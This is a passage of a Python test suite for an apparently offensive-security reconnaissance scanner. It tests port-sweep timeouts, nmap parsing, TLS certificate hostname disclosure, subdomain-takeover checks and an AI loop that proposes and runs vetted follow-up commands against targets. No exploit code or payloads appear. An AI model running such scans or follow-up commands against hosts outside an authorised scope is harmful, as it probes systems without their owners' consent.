
class PreservePreviousXmlTests(unittest.TestCase):
    """The file resume is about to overwrite must not simply vanish."""

    def _engine(self):
        import tempfile
        from assay.config import Config
        from assay.engine import Engine
        self.out = tempfile.mkdtemp()
        return Engine(Config(targets=["10.0.0.1"], out_dir=self.out,
                             resume=True, journal=False))

    def test_an_existing_file_is_copied_before_it_would_be_overwritten(self):
        import os
        eng = self._engine()
        raw = os.path.join(eng.cfg.out_dir, "raw")
        os.makedirs(raw, exist_ok=True)
        with open(os.path.join(raw, "nmap.xml"), "w") as fh:
            fh.write("original content")
        eng._preserve_previous_xml("nmap")
        with open(os.path.join(raw, "nmap-previous.xml")) as fh:
            self.assertEqual(fh.read(), "original content")
        with open(os.path.join(raw, "nmap.xml")) as fh:
            self.assertEqual(fh.read(), "original content",
                             "preserving must not touch the original either")

    def test_nothing_to_preserve_is_not_an_exception(self):
        eng = self._engine()
        eng._preserve_previous_xml("nmap")   # no raw/nmap.xml exists yet


class CutOffToolTests(unittest.TestCase):
    """A tool that is writing a result file needs to be asked to stop."""

    def _probe(self, tmpdir):
        """A tool that only writes its closing bytes if it can clean up."""
        import os
        out = os.path.join(tmpdir, "out.txt")
        return out, ['bash', '-c',
                     'trap "echo CLOSED >> %s; exit 0" TERM; echo OPEN > %s; '
                     'while true; do echo tick; sleep 0.05; done' % (out, out)]

    def test_a_cut_off_tool_gets_to_finish_its_output_file(self):
        import tempfile
        from assay import tools
        out, cmd = self._probe(tempfile.mkdtemp())
        list(tools.stream_lines(cmd, timeout=0.4))
        with open(out) as fh:
            self.assertEqual(fh.read().split(), ["OPEN", "CLOSED"],
                             "SIGKILL would have lost the closing write")

    def test_the_kill_is_still_there_for_a_tool_that_ignores_the_ask(self):
        import tempfile, time
        from assay import tools
        stub = os.path.join(tempfile.mkdtemp(), "stubborn.sh")
        with open(stub, "w") as fh:
            fh.write('trap "" TERM\nwhile true; do echo tick; sleep 0.05; done\n')
        t = time.time()
        list(tools.stream_lines(["bash", stub], timeout=0.3))
        self.assertLess(time.time() - t, 20.0, "it must not hang on a deaf tool")

    def test_the_stdout_pipe_is_closed_not_left_to_the_collector(self):
        """One leaked descriptor per streamed command adds up over a scan."""
        import subprocess as sp
        from assay import tools
        spawned = []
        original = sp.Popen

        def spy(*a, **kw):
            p = original(*a, **kw)
            spawned.append(p)
            return p

        sp.Popen = spy
        try:
            list(tools.stream_lines(["bash", "-c", "echo a; echo b"], timeout=30.0))
            it = tools.stream_lines(["bash", "-c", "echo a; sleep 5"], timeout=30.0)
            next(it)
            it.close()          # the caller hit its own cap and stopped reading
        finally:
            sp.Popen = original
        self.assertEqual(len(spawned), 2)
        for p in spawned:
            self.assertTrue(p.stdout.closed, "the pipe must be closed explicitly")


class PortCountTests(unittest.TestCase):
    """Both timeout budgets are built on this, so it has to read every form."""

    def test_every_spec_form_the_engine_produces(self):
        from assay.tools import port_count
        self.assertEqual(port_count("top-100"), 100)
        self.assertEqual(port_count("top-1000"), 1000)
        self.assertEqual(port_count("all"), 65535)
        self.assertEqual(port_count("80,443,8080"), 3)
        self.assertEqual(port_count("1-1000"), 1000)
        self.assertEqual(port_count("22"), 1)

    def test_the_ai_ports_suffix_is_added_not_ignored(self):
        """'top-1000+3000,5000' is a union; budgeting only the base under-counts."""
        from assay.tools import port_count
        self.assertEqual(port_count("top-1000+3000,5000"), 1002)

    def test_nonsense_still_yields_a_usable_number(self):
        """A bad spec must not divide a timeout by zero or raise."""
        from assay.tools import port_count
        self.assertGreaterEqual(port_count(""), 1)
        self.assertGreaterEqual(port_count("not-ports"), 1)


class NmapHostgroupTests(unittest.TestCase):
    """nmap writes a host only when its group finishes, so the group size is
    the checkpoint interval - and one group means a scan cut off at 99% has
    written nothing at all."""

    def test_a_small_scan_is_not_fragmented(self):
        from assay.tools import nmap_hostgroup, NMAP_MIN_HOSTGROUP
        self.assertIsNone(nmap_hostgroup(["h"] * NMAP_MIN_HOSTGROUP))

    def test_a_big_scan_is_split_into_a_handful_of_batches(self):
        from assay.tools import nmap_hostgroup, NMAP_CHECKPOINTS
        for n in (55, 254, 1024):
            group = nmap_hostgroup(["h"] * n)
            batches = -(-n // group)
            self.assertLessEqual(batches, NMAP_CHECKPOINTS + 1,
                                 "%d hosts became %d batches" % (n, batches))
            self.assertGreater(batches, 1, "%d hosts must checkpoint" % n)

    def test_the_flag_reaches_nmap(self):
        from assay import tools
        seen = []

        def fake_stream(cmd, timeout=900.0, stdin="", ledger=True):
            seen.append(list(cmd))
            return iter(())

        original = tools.stream_lines
        tools.stream_lines = fake_stream
        try:
            tools.nmap_scan(["10.0.0.%d" % i for i in range(55)], "80,443", {})
        finally:
            tools.stream_lines = original
        self.assertTrue(seen)
        self.assertIn("--max-hostgroup", seen[0])
        self.assertEqual(seen[0][seen[0].index("--max-hostgroup") + 1], "16")

    def test_a_small_scan_gets_no_flag(self):
        """Fragmenting a scan that was one batch anyway only costs speed."""
        from assay import tools
        seen = []

        def fake_stream(cmd, timeout=900.0, stdin="", ledger=True):
            seen.append(list(cmd))
            return iter(())

        original = tools.stream_lines
        tools.stream_lines = fake_stream
        try:
            tools.nmap_scan(["10.0.0.1", "10.0.0.2"], "80,443", {})
        finally:
            tools.stream_lines = original
        self.assertNotIn("--max-hostgroup", seen[0])


class KatanaTimeoutTests(unittest.TestCase):
    """katana had the same flat-timeout bug as nmap, naabu and httpx: a
    crawl of 359 endpoints hit a flat 600s cap at 317 URLs, right after the
    -kf fix finally let it run for real."""

    def test_it_grows_with_the_candidate_count(self):
        from assay.tools import katana_timeout
        self.assertGreater(katana_timeout(["h"] * 359, 2, {}),
                           katana_timeout(["h"], 2, {}))

    def test_it_grows_with_depth(self):
        from assay.tools import katana_timeout
        self.assertGreater(katana_timeout(["h"] * 100, 3, {}),
                           katana_timeout(["h"] * 100, 1, {}))

    def test_the_run_that_hit_600s_would_now_get_more(self):
        from assay.tools import katana_timeout
        self.assertGreater(katana_timeout(["h"] * 359, 2, {}), 600.0)

    def test_more_threads_shortens_the_worst_case(self):
        from assay.tools import katana_timeout
        few = katana_timeout(["h"] * 100, 2, {"concurrency": 2})
        many = katana_timeout(["h"] * 100, 2, {"concurrency": 10})
        self.assertGreater(few, many)

    def test_concurrency_above_katanas_own_10_cap_does_not_help_further(self):
        """-c is capped at 10 in the command itself; the budget must agree."""
        from assay.tools import katana_timeout
        at_cap = katana_timeout(["h"] * 100, 2, {"concurrency": 10})
        above_cap = katana_timeout(["h"] * 100, 2, {"concurrency": 50})
        self.assertEqual(at_cap, above_cap)

    def test_a_zero_or_missing_concurrency_does_not_divide_by_zero(self):
        from assay.tools import katana_timeout
        self.assertGreater(katana_timeout(["h"], 2, {"concurrency": 0}), 0)
        self.assertGreater(katana_timeout(["h"], 2, {}), 0)

    def test_it_is_bounded(self):
        from assay.tools import katana_timeout, KATANA_TIMEOUT_CAP
        self.assertEqual(katana_timeout(["h"] * 999999, 5, {}), KATANA_TIMEOUT_CAP)

    def test_an_explicit_timeout_still_wins(self):
        from assay import tools
        seen = []

        def fake_stream_json(cmd, timeout=900.0, ledger=True):
            seen.append(timeout)
            return iter(())

        original = tools.stream_json
        tools.stream_json = fake_stream_json
        try:
            tools.katana_crawl(["https://10.0.0.1/"], depth=2, tune={},
                               max_urls=60, timeout=42.0)
        finally:
            tools.stream_json = original
        self.assertEqual(seen, [42.0])

    def test_no_explicit_timeout_uses_the_scaled_default(self):
        from assay import tools
        seen = []

        def fake_stream_json(cmd, timeout=900.0, ledger=True):
            seen.append(timeout)
            return iter(())

        original = tools.stream_json
        tools.stream_json = fake_stream_json
        try:
            tools.katana_crawl(["h"] * 359, depth=2, tune={}, max_urls=60)
        finally:
            tools.stream_json = original
        self.assertEqual(seen, [tools.katana_timeout(["h"] * 359, 2, {})])
        self.assertGreater(seen[0], 600.0)


class HttpxTimeoutTests(unittest.TestCase):
    """httpx had the same flat-timeout bug as nmap and naabu: a run of 2187
    speculative host:port candidates hit a flat 600s cap at 155 confirmed
    live endpoints - most candidates never got the chance to answer."""

    def test_it_grows_with_the_candidate_count(self):
        from assay.tools import httpx_timeout
        self.assertGreater(httpx_timeout(["h"] * 2187, {}), httpx_timeout(["h"], {}))

    def test_the_run_that_hit_600s_would_no_longer(self):
        from assay.tools import httpx_timeout
        self.assertGreater(httpx_timeout(["h"] * 2187, {}), 600.0)

    def test_more_threads_shortens_the_worst_case(self):
        from assay.tools import httpx_timeout
        few = httpx_timeout(["h"] * 500, {"concurrency": 5})
        many = httpx_timeout(["h"] * 500, {"concurrency": 50})
        self.assertGreater(few, many)

    def test_a_zero_or_missing_concurrency_does_not_divide_by_zero(self):
        from assay.tools import httpx_timeout
        self.assertGreater(httpx_timeout(["h"], {"concurrency": 0}), 0)
        self.assertGreater(httpx_timeout(["h"], {}), 0)

    def test_it_is_bounded(self):
        from assay.tools import httpx_timeout, HTTPX_TIMEOUT_CAP
        self.assertEqual(httpx_timeout(["h"] * 999999, {}), HTTPX_TIMEOUT_CAP)

    def test_an_explicit_timeout_still_wins(self):
        from assay import tools
        seen = []

        def fake_stream_json(cmd, timeout=900.0, ledger=True):
            seen.append(timeout)
            return iter(())

        original = tools.stream_json
        tools.stream_json = fake_stream_json
        try:
            list(tools.httpx_probe(["10.0.0.1:80"], {}, timeout=42.0))
        finally:
            tools.stream_json = original
        self.assertEqual(seen, [42.0])

    def test_no_explicit_timeout_uses_the_scaled_default(self):
        from assay import tools
        seen = []

        def fake_stream_json(cmd, timeout=900.0, ledger=True):
            seen.append(timeout)
            return iter(())

        original = tools.stream_json
        tools.stream_json = fake_stream_json
        try:
            list(tools.httpx_probe(["h"] * 2187, {}))
        finally:
            tools.stream_json = original
        self.assertEqual(seen, [tools.httpx_timeout(["h"] * 2187, {})])
        self.assertGreater(seen[0], 600.0)


class NaabuTimeoutTests(unittest.TestCase):
    """naabu had nmap's bug waiting: a flat 900s for any size of sweep."""

    def test_a_subnet_sweep_of_1000_ports_outgrows_the_old_flat_cap(self):
        from assay.tools import naabu_timeout
        self.assertGreater(naabu_timeout(["h"] * 254, "top-1000", {}), 900.0)

    def test_it_follows_the_probe_count(self):
        from assay.tools import naabu_timeout
        few = naabu_timeout(["h"] * 10, "top-100", {})
        many = naabu_timeout(["h"] * 10, "top-1000", {})
        self.assertGreater(many, few, "ten times the ports is not the same wait")

    def test_a_faster_rate_buys_a_shorter_wait(self):
        from assay.tools import naabu_timeout
        slow = naabu_timeout(["h"] * 50, "top-1000", {"nmap_min_rate": 100})
        fast = naabu_timeout(["h"] * 50, "top-1000", {"nmap_min_rate": 1000})
        self.assertGreater(slow, fast)

    def test_a_zero_rate_does_not_divide_by_zero(self):
        from assay.tools import naabu_timeout
        self.assertGreater(naabu_timeout(["h"], "top-100", {"nmap_min_rate": 0}), 0)

    def test_it_is_bounded(self):
        from assay.tools import naabu_timeout, NAABU_TIMEOUT_CAP
        self.assertEqual(naabu_timeout(["h"] * 99999, "all", {}), NAABU_TIMEOUT_CAP)

    def _budgets(self, spec, **kw):
        from assay import tools
        seen = []

        def fake_stream_json(cmd, timeout=900.0, stdin="", ledger=True):
            seen.append(timeout)
            return iter(())

        original = tools.stream_json
        tools.stream_json = fake_stream_json
        try:
            tools.naabu_scan(["10.0.0.1"], spec, {}, **kw)
        finally:
            tools.stream_json = original
        return seen

    def test_the_extra_ports_pass_is_budgeted_on_its_own_ports(self):
        """Two ports must not inherit the thousand-port sweep's allowance."""
        base, extra = self._budgets("top-1000+3000,5000")
        self.assertGreater(base, extra)

    def test_an_explicit_timeout_still_wins_for_both_passes(self):
        self.assertEqual(self._budgets("top-1000+3000,5000", timeout=42.0), [42.0, 42.0])


class NmapTimeoutTests(unittest.TestCase):
    """The cap has to follow the size of the sweep it is capping."""

    def test_it_grows_with_the_host_count(self):
        from assay.tools import nmap_timeout
        self.assertGreater(nmap_timeout(["h"] * 55), nmap_timeout(["h"]))

    def test_a_subnet_sweep_is_not_cut_off_at_half_an_hour(self):
        """55 hosts of -sV is the scan that lost 48 minutes to a flat 1800s."""
        from assay.tools import nmap_timeout
        self.assertGreater(nmap_timeout(["h"] * 55), 1800.0)

    def test_it_is_bounded_so_a_huge_sweep_cannot_run_forever(self):
        from assay.tools import nmap_timeout, NMAP_TIMEOUT_CAP
        self.assertEqual(nmap_timeout(["h"] * 100000), NMAP_TIMEOUT_CAP)

    def test_an_explicit_timeout_still_wins(self):
        from assay import tools
        seen = []

        def fake_stream(cmd, timeout=900.0, stdin="", ledger=True):
            seen.append(timeout)
            return iter(())

        original = tools.stream_lines
        tools.stream_lines = fake_stream
        try:
            tools.nmap_scan(["10.0.0.5"], "top-1000", {}, timeout=42.0)
        finally:
            tools.stream_lines = original
        self.assertEqual(seen, [42.0])


class ParseNmapXmlTests(unittest.TestCase):
    """parse_nmap_xml() used to key its result by the reverse-DNS hostname
    whenever nmap resolved one, discarding the address entirely. A target
    given as a bare IP is matched back to its Target by IP, never by a
    reverse-DNS name it never asked for -- so a host with a resolvable PTR
    record had its entire port list keyed under a string nothing else in the
    pipeline recognised, and silently vanished (mta2/mta3/vass.example.com's
    port 25/smtp results in a real scan, among others)."""

    def _write_sample(self) -> str:
        import os, tempfile
        path = os.path.join(tempfile.mkdtemp(), "nmap.xml")
        with open(path, "w", encoding="utf-8") as fh:
            fh.write(_NMAP_XML_SAMPLE)
        return path

    def test_keyed_by_address_even_when_a_hostname_resolves(self):
        from assay import tools
        path = self._write_sample()
        result = tools.parse_nmap_xml(path)
        self.assertIn("203.0.113.64", result,
                      "must be keyed by the scanned address, not the PTR name")
        self.assertNotIn("mta2.example.com", result)
        host = result["203.0.113.64"]
        self.assertEqual([p.port for p in host.ports], [25])
        self.assertEqual(host.hostnames, ["mta2.example.com"])

    def test_host_with_no_resolvable_hostname_still_keyed_by_address(self):
        from assay import tools
        path = self._write_sample()
        result = tools.parse_nmap_xml(path)
        self.assertIn("203.0.113.92", result)
        self.assertEqual(result["203.0.113.92"].hostnames, [])
        self.assertEqual([p.port for p in result["203.0.113.92"].ports], [443])


class TlsSanDisclosureTests(unittest.TestCase):
    """The 'Certificate SANs disclose N additional hostnames' finding named
    a count but never the names themselves anywhere the terminal dashboard
    or `assay show` actually display -- they were evidence-only, and the
    terminal's summary table has no evidence-expand step at all (that is an
    HTML-report-only feature), so the names were effectively invisible."""

    def test_disclosed_hostnames_are_in_detail_not_just_evidence(self):
        from assay.modules.tls import TlsModule
        cert = {
            "subject": [[("commonName", "app.example.com")]],
            "issuer": [[("commonName", "Some CA")]],
            "subjectAltName": [
                ("DNS", "app.example.com"),
                ("DNS", "internal-admin.example.com"),
                ("DNS", "staging.example.com"),
                ("DNS", "db-01.example.com"),
                ("DNS", "vpn.example.com"),
            ],
        }
        findings = TlsModule()._cert_findings("app.example.com", 443, cert)
        san = next(f for f in findings if "SANs disclose" in f.title)
        self.assertIn("internal-admin.example.com", san.detail)
        self.assertIn("staging.example.com", san.detail)
        self.assertIn("db-01.example.com", san.detail)
        self.assertIn("vpn.example.com", san.detail)

    def test_long_san_list_is_capped_in_detail_with_a_remainder_count(self):
        from assay.modules.tls import TlsModule
        cert = {
            "subject": [[("commonName", "app.example.com")]],
            "issuer": [[("commonName", "Some CA")]],
            "subjectAltName": [("DNS", "app.example.com")] +
                [("DNS", "host%d.example.com" % i) for i in range(30)],
        }
        findings = TlsModule()._cert_findings("app.example.com", 443, cert)
        san = next(f for f in findings if "SANs disclose" in f.title)
        self.assertIn("+10 more", san.detail)


    def test_same_cert_on_many_hosts_yields_one_dedupe_identity(self):
        from assay.modules.tls import TlsModule
        sans = [("DNS", n) for n in ("a.example.com", "b.example.com",
                                     "c.example.com")]
        def fid(host, port, order):
            cert = {"subject": [[("commonName", host)]],
                    "issuer": [[("commonName", "Some CA")]],
                    "subjectAltName": order(sans)}
            f = next(f for f in TlsModule()._cert_findings(host, port, cert)
                     if "SANs disclose" in f.title)
            return f.fingerprint()
        self.assertEqual(fid("a.example.com", 443, list),
                         fid("b.example.com", 8443, lambda x: x[::-1]))

    def test_different_san_sets_stay_distinct(self):
        from assay.modules.tls import TlsModule
        def fid(extra):
            cert = {"subject": [[("commonName", "x.example.com")]],
                    "issuer": [[("commonName", "Some CA")]],
                    "subjectAltName": [("DNS", n) for n in extra]}
            return next(f for f in TlsModule()._cert_findings(
                "x.example.com", 443, cert)
                if "SANs disclose" in f.title).fingerprint()
        self.assertNotEqual(fid(["a.example.com", "b.example.com"]),
                            fid(["a.example.com", "c.example.com"]))


class DomainWellFormedTests(unittest.TestCase):
    """CSP/JS blobs yield hostname-shaped strings with no real TLD; RDAP 404s
    those like a free domain, so they must never reach the takeover verdict."""

    class _Http:
        def __init__(self, tlds=("com", "net")):
            self.tlds, self.calls = tlds, []
        def get(self, url, **kw):
            self.calls.append(url)
            body = json.dumps({"services": [[list(self.tlds), ["x"]]]})
            return type("R", (), {"ok": bool(self.tlds), "status": 200,
                                  "body": body, "error": ""})()

    def setUp(self):
        from assay import domains
        self.domains = domains
        domains._TLDS = None

    def tearDown(self):
        self.domains._TLDS = None

    def test_unknown_tld_is_rejected(self):
        why = self.domains.well_formed("citrix.agmacepa", self._Http())
        self.assertIn("not a delegated top-level domain", why)

    def test_bad_label_syntax_is_rejected(self):
        h = self._Http()
        self.assertTrue(self.domains.well_formed("-bad.com", h))
        self.assertTrue(self.domains.well_formed("a..com", h))
        self.assertTrue(self.domains.well_formed("nodots", h))

    def test_real_tld_passes(self):
        self.assertEqual(self.domains.well_formed("example.com", self._Http()), "")

    def test_unloadable_tld_list_fails_closed_and_is_not_cached(self):
        self.assertIn("IANA", self.domains.well_formed("example.com",
                                                       self._Http(tlds=())))
        self.assertIsNone(self.domains._TLDS)

    def test_check_skips_invalid_name_without_dns_or_rdap(self):
        from unittest import mock
        h = self._Http()
        with mock.patch.object(self.domains, "ns_records",
                               side_effect=AssertionError("no DNS")):
            st = self.domains.check("citrix.agmacepa", h)
        self.assertIsNone(st.registered)
        self.assertFalse(st.takeoverable)
        self.assertTrue(st.reason.startswith("skipped"))
        self.assertTrue(all("rdap.org" not in c for c in h.calls))


class SoftwareProvenanceTests(unittest.TestCase):
    """A detected version is only useful if the hunter can re-check where it
    came from: each inventory row must carry the literal text and a command."""

    def _web(self):
        wt = web_target("https://app.example.com/",
                        headers={"Server": "Apache/2.4.41 (Ubuntu)"})
        wt.server = "Apache/2.4.41 (Ubuntu)"
        wt.body_sample = ('<html><script src="/static/jquery-3.4.1.min.js">'
                          '</script></html>')
        return wt

    def test_rows_carry_literal_proof_and_repro(self):
        from assay import software
        rows = {r["name"]: r for r in software.merge(
            software.collect_from_web(self._web()))}
        jq = rows["jQuery"]["proof"][0]
        self.assertIn("jquery-3.4.1.min.js", jq["proof"])
        self.assertIn("curl", jq["repro"])
        self.assertIn("grep", jq["repro"])
        ap = rows["Apache"]["proof"][0]
        self.assertEqual(ap["proof"], "Server: Apache/2.4.41 (Ubuntu)")
        self.assertIn("curl -skI", ap["repro"])

    def test_nmap_rows_carry_a_rescan_command(self):
        from assay import software
        from assay.models import Port, Target
        t = Target(raw="10.0.0.5", host="10.0.0.5", ports=[Port(port=22, product="OpenSSH",
                                                version="8.2p1")])
        proof = software.collect_from_host(t)[0]
        self.assertIn("8.2p1", proof.proof)
        self.assertEqual(proof.repro, "nmap -sV -Pn -p 22 10.0.0.5")

    def test_cve_finding_evidence_shows_where_version_was_read(self):
        from assay import software
        from assay.cve import CveMatch
        from assay.modules.inventory import InventoryModule
        row = next(r for r in software.merge(
            software.collect_from_web(self._web())) if r["name"] == "jQuery")
        m = CveMatch(cve_id="CVE-2020-11022", severity="medium", score=6.1,
                     summary="x", published="2020", url="https://nvd.nist.gov/vuln/detail/x")
        f = InventoryModule()._cve_finding(row, [m])
        ev = f.evidence[0]
        self.assertIn("jquery-3.4.1.min.js", ev.output)
        self.assertIn("curl", ev.request)
        self.assertEqual(f.evidence[-1].label, "NVD keywordSearch match")


class AiLoopFeedbackTests(unittest.TestCase):
    """assay -> claude -> assay -> claude: results go back redacted by default,
    and the loop ends on a verdict rather than on unread output."""

    def test_digest_is_content_free(self):
        from assay import followup
        d = followup.digest("HTTP/1.1 200 OK\nSet-Cookie: s=SECRET\n\nbody", 0)
        self.assertIn("HTTP status 200", d)
        self.assertIn("exit 0", d)
        self.assertNotIn("SECRET", d)
        self.assertNotIn("body", d)

    def test_system_prompt_explains_followup_results(self):
        from assay import ai
        self.assertIn("followup_results", ai.SYSTEM_PROMPT)
        self.assertIn("never repeat", ai.SYSTEM_PROMPT)

    def _run(self, rounds, extra=None):
        import argparse
        from unittest import mock
        from assay import cli, followup
        calls = []

        def fake_ai(store, cfg, args, assets, redactor=None, followups=None):
            calls.append(list(followups or []))
            return {"triage": [], "chains": [], "summary": ""}

        n = {"i": 0}

        def fake_collect(store, rmap):
            n["i"] += 1
            return [followup.Command(raw="curl https://t%d.example.org/" % n["i"],
                                     finding_id="f1")]

        def fake_vet(raw, cfg):
            return followup.Command(raw=raw, ok=True, tier="passive",
                                    argv=raw.split(), hosts=["h"])

        def fake_run(v, timeout=0):
            v.output, v.rc = "HTTP/1.1 403 Forbidden\nSet-Cookie: s=SECRET", 0

        store = mock.MagicMock()
        store.host_rows.return_value = []
        store.web_rows.return_value = []
        cfg = mock.MagicMock()
        cfg.safe_mode = False
        cfg.scope.permissive = False
        cfg.targets, cfg.scope.allow = [], []
        ns = dict(ai_loop_rounds=rounds, ai_loop_auto="passive",
                  ai_followup_limit=25, ai_followup_timeout=5.0,
                  ai_loop_rate=5, ai_backend="claude-cli")
        ns.update(extra or {})
        with mock.patch.object(cli, "run_ai", fake_ai), \
             mock.patch.object(followup, "collect", fake_collect), \
             mock.patch.object(followup, "vet", fake_vet), \
             mock.patch.object(followup, "run", fake_run):
            cli.run_ai_loop(store, cfg, argparse.Namespace(**ns), {})
        return calls, store

    def test_results_feed_back_by_default_as_a_digest_for_curl(self):
        calls, _ = self._run(rounds=3)
        self.assertEqual(calls[0], [])
        self.assertGreaterEqual(len(calls), 2)
        fed = calls[1][0]
        self.assertIn("HTTP status 403", fed["output"])
        self.assertNotIn("SECRET", fed["output"])

    def test_final_round_runs_nothing(self):
        calls, store = self._run(rounds=2)
        self.assertEqual(len(calls), 2)
        # one command ran after round 1; none after the final triage. Commands
        # that were only queued are recorded too (state="queued"), so count
        # the ones that actually ran.
        ran = [c for c in store.record_followup_result.call_args_list
               if c.kwargs.get("state") != "queued"]
        self.assertEqual(len(ran), 1)

    def test_no_resend_is_a_single_round(self):
        calls, _ = self._run(rounds=3, extra={"ai_loop_no_resend": True})
        self.assertEqual(len(calls), 1)


class WizardTests(unittest.TestCase):
    """First-run questions replace remembering flags, without overriding a flag
    that was passed and without asking anything when there is no terminal."""

    def _args(self, *argv):
        from assay.cli import build_parser
        return build_parser().parse_args(["scan", "a.test"] + list(argv))

    def _ask(self, answers):
        it = iter(answers)
        self.prompts = []
        def ask(q):
            self.prompts.append(q)
            return next(it)
        return ask

    def test_enter_everywhere_gives_the_defaults(self):
        from assay import wizard
        a = self._args()
        wizard.ask_options(a, self._ask([""] * 20), lambda *x: None)
        self.assertEqual(a.profile, "standard")
        self.assertFalse(a.no_expand or a.no_passive or a.no_udp or a.no_deep_ports)
        self.assertFalse(a.aggressive)
        self.assertFalse(a.ai)
        self.assertFalse(a.ai_loop)

    def test_answers_land_on_the_flags(self):
        from assay import wizard
        a = self._args()
        # depth, expand, passive, udp, (deep ports skipped on deep), batches,
        # aggressive, ai, loop, backend, rounds
        wizard.ask_options(a, self._ask(
            ["deep", "n", "n", "n", "10", "y", "y", "y", "api", "2"]),
            lambda *x: None)
        self.assertEqual(a.sweep_batches, 10)
        self.assertEqual(a.profile, "deep")
        self.assertTrue(a.no_expand and a.no_passive and a.no_udp)
        self.assertTrue(a.aggressive and a.ai and a.ai_loop)
        self.assertEqual(a.ai_backend, "api")
        self.assertEqual(a.ai_loop_rounds, 2)

    def test_deep_profile_skips_the_deep_port_question(self):
        from assay import wizard
        a = self._args("-p", "deep")
        wizard.ask_options(a, self._ask([""] * 20), lambda *x: None)
        self.assertFalse(any("deep port" in p for p in self.prompts))

    def test_flags_already_given_are_not_asked_again(self):
        from assay import wizard
        a = self._args("-p", "quick", "--no-expand", "--aggressive",
                       "--ai-loop", "--ai-backend", "claude-cli",
                       "--ai-loop-rounds", "4")
        wizard.ask_options(a, self._ask([""] * 20), lambda *x: None)
        text = " ".join(self.prompts)
        for word in ("depth", "expand", "aggressive", "AI triage", "iterate",
                     "backend", "rounds"):
            self.assertNotIn(word, text)
        self.assertEqual(a.ai_loop_rounds, 4)

    def test_safe_mode_skips_intrusive_questions(self):
        from assay import wizard
        a = self._args("--safe")
        wizard.ask_options(a, self._ask([""] * 20), lambda *x: None)
        text = " ".join(self.prompts)
        self.assertNotIn("aggressive", text)
        self.assertNotIn("UDP", text)

    def test_invalid_answer_reprompts(self):
        from assay import wizard
        a = self._args()
        wizard.ask_options(a, self._ask(["bogus", "quick"] + [""] * 20),
                           lambda *x: None)
        self.assertEqual(a.profile, "quick")

    def test_no_questions_without_a_terminal(self):
        from unittest import mock
        from assay import cli
        a = self._args()
        with mock.patch("assay.wizard.interactive", return_value=False), \
             mock.patch("assay.wizard.ask_options",
                        side_effect=AssertionError("asked")):
            cli._ask_scan_options(a)


class NaabuSweepTests(unittest.TestCase):
    """A time limit must cost a slice of the sweep, never silently the whole
    of it: timed-out batches are split and re-run, and whatever still was not
    swept is reported."""

    TUNE = {"nmap_min_rate": 1000}

    def test_plan_batches_honours_a_requested_count(self):
        from assay import tools
        hosts = ["h%d" % i for i in range(100)]
        b = tools.plan_batches(hosts, "all", self.TUNE, requested=10)
        self.assertEqual(len(b), 10)
        self.assertEqual(sorted(sum(b, [])), sorted(hosts))

    def test_plan_batches_never_exceeds_host_count_and_auto_sizes(self):
        from assay import tools
        self.assertEqual(len(tools.plan_batches(["a", "b"], "all", self.TUNE, 10)), 2)
        self.assertEqual(len(tools.plan_batches(["a"], "top-100", self.TUNE)), 1)
        many = ["h%d" % i for i in range(3000)]
        self.assertGreater(len(tools.plan_batches(many, "all", self.TUNE)), 1)

    def _scan(self, slow):
        calls = []
        def scan(hosts, spec, tune, timeout=None, status=None):
            calls.append(list(hosts))
            if any(h in slow for h in hosts) and len(hosts) > 1:
                status["timed_out"] = True
            return {h: [80] for h in hosts}
        return scan, calls

    def test_timed_out_batch_is_split_and_rerun_to_completion(self):
        from assay import tools
        hosts = ["a", "b", "c", "d"]
        scan, calls = self._scan(slow={"a"})
        found, missed = tools.naabu_sweep(hosts, "all", self.TUNE, batches=1,
                                          scan=scan)
        self.assertEqual(missed, [])
        self.assertEqual(sorted(found), hosts)
        self.assertGreater(len(calls), 1)

    def test_host_that_always_times_out_is_reported_not_dropped(self):
        from assay import tools
        def scan(hosts, spec, tune, timeout=None, status=None):
            if "bad" in hosts:
                status["timed_out"] = True
            return {}
        found, missed = tools.naabu_sweep(["ok", "bad"], "all", self.TUNE,
                                          batches=1, scan=scan)
        self.assertEqual(missed, ["bad"])

    def test_skipped_batch_is_not_retried(self):
        from assay import tools
        calls = []
        def scan(hosts, spec, tune, timeout=None, status=None):
            calls.append(hosts)
            status["skipped"] = True
            return {}
        _, missed = tools.naabu_sweep(["a", "b"], "all", self.TUNE, batches=1,
                                      scan=scan)
        self.assertEqual(len(calls), 1)
        self.assertEqual(sorted(missed), ["a", "b"])

    def test_resume_skips_hosts_already_swept(self):
        import tempfile
        from assay import tools
        scan, calls = self._scan(slow=set())
        with tempfile.TemporaryDirectory() as d:
            path = os.path.join(d, "p.json")
            tools.naabu_sweep(["a", "b"], "all", self.TUNE, batches=1,
                              progress_path=path, scan=scan)
            calls.clear()
            found, missed = tools.naabu_sweep(["a", "b", "c"], "all", self.TUNE,
                                              batches=1, progress_path=path,
                                              resume=True, scan=scan)
        self.assertEqual(calls, [["c"]])
        self.assertEqual(sorted(found), ["a", "b", "c"])
        self.assertEqual(missed, [])

    def test_cap_is_raised_for_deep_sweeps(self):
        from assay import tools
        capped = tools.naabu_timeout(["h"] * 3000, "all", self.TUNE)
        raised = tools.naabu_timeout(["h"] * 3000, "all", self.TUNE, cap=12 * 3600)
        self.assertEqual(capped, tools.NAABU_TIMEOUT_CAP)
        self.assertGreater(raised, capped)


class ScanHistoryTests(unittest.TestCase):
    """A host fully scanned in an earlier run of the engagement is skipped
    next time (its stored results still reach the report); new or partially-
    swept hosts are always scanned; --rescan redoes everything."""

    def _store(self):
        import tempfile
        from assay.store import Store
        d = tempfile.mkdtemp()
        st = Store(os.path.join(d, "assay.db"))
        st.start_run("standard", ["x"])
        return st

    def test_broader_spec_replaces_narrower_and_narrower_does_not_downgrade(self):
        from assay import tools
        st = self._store()
        st.record_scan_complete("h", "203.0.113.11", "top-1000", False, tools.spec_covers)
        self.assertEqual(st.scan_history()["h"]["port_spec"], "top-1000")
        st.record_scan_complete("h", "203.0.113.11", "all", False, tools.spec_covers)
        self.assertEqual(st.scan_history()["h"]["port_spec"], "all")
        st.record_scan_complete("h", "203.0.113.11", "top-100", False, tools.spec_covers)
        self.assertEqual(st.scan_history()["h"]["port_spec"], "all")
        st.close()

    def test_clean_sweep_clears_an_earlier_timeout(self):
        from assay import tools
        st = self._store()
        st.record_scan_complete("h", "203.0.113.11", "all", True, tools.spec_covers)
        self.assertEqual(int(st.scan_history()["h"]["timed_out"]), 1)
        st.record_scan_complete("h", "203.0.113.11", "all", False, tools.spec_covers)
        self.assertEqual(int(st.scan_history()["h"]["timed_out"]), 0)
        st.close()

    def _engine(self, targets):
        import tempfile
        from assay.config import Config
        from assay.engine import Engine
        from assay.models import Target
        d = tempfile.mkdtemp()
